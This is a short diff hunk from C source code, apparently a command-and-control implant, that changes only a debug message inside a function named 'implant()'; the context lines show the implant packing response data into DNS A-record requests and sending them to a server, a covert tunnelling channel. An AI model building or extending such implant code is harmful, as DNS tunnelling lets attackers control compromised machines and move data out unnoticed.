@@ -30,7 +30,7 @@ void implant() {
                 char **req = payload_to_dns_a(response_bytes, response_bytes_len, &req_len);
                 int status = send_response(client, req, req_len);
                 if (status != 0) {
-                    Dprintf("[d] server failed to accepted our response data");
+                    Dprintf("[d] server failed to accepted our response data\n");
                 }
 
                 free(client->command);
